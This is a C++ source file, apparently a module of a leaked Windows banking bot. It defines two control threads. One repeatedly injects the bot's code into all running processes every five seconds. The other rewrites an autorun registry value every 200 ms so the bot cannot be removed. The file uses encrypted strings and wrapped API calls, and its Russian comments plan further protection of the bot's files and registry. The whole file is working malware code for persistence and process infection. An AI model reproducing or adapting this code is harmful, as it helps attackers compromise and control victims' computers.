#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "coreinject.h"
#include "corecontrol.h"
#include "cryptedstrings.h"

#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\sync.h"
#include "..\common\registry.h"

void CoreControl::init(void)
{

}

void CoreControl::uninit(void)
{

}

static DWORD WINAPI procInfection(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);

  //FIXME: защита файлов бота, если не влючен TT защищаемся также от чтения.  
  //FIXME: защита реестра, путем восстановления.
  
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_INFECTION, MalwareTools::KON_SESSION);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed.");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");
  if(Core::isActive())
  {
    CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_IDLE);
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 5000) == WAIT_TIMEOUT)CoreInject::_injectToAll();
  }

  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

static DWORD WINAPI procAutorun(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_NORMAL);

  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_CONTROL_AUTORUN, MalwareTools::KON_SESSION);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }

  WDEBUG0(WDDT_INFO, "Started.");

  WCHAR autorunName[50];
  WCHAR processPath[MAX_PATH];
  DWORD processPathSize;
  
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  Core::getPeSettingsPath(Core::PSP_COREFILE, processPath);
  CWA(shlwapi, PathQuoteSpacesW)(processPath);
  processPathSize = Str::_LengthW(processPath);
  
  //Цикл.
  if(Core::isActive())
  {
    CSTR_GETW(regPath, regpath_autorun);
    while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 200) == WAIT_TIMEOUT)
    {
      Registry::_setValueAsString(HKEY_CURRENT_USER, regPath, autorunName, processPath, processPathSize);
    }
  }
  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

bool CoreControl::_create(ThreadsGroup::GROUP *group)
{
  bool ok1 = ThreadsGroup::_createThread(group, 0, procInfection, NULL, NULL, NULL);
  bool ok2 = ThreadsGroup::_createThread(group, 0, procAutorun, NULL, NULL, NULL);
  return (ok1 || ok2);
}

bool CoreControl::_removeAutorun(void)
{
  WCHAR autorunName[50];
  Core::generateObjectName(Core::OBJECT_ID_REG_AUTORUN, autorunName, MalwareTools::KON_DEFAULT);
  
  CSTR_GETW(regPath, regpath_autorun);
  for(BYTE i = 0; i < 5; i++)
  {
    if(!Registry::_deleteValue(HKEY_CURRENT_USER, regPath, autorunName))return false;
    
    //Страховка от незавершенного procAutorun().
    CWA(kernel32, Sleep)(500);
    if(!Registry::_valueExists(HKEY_CURRENT_USER, regPath, autorunName))return true;
  }
  return false;
}
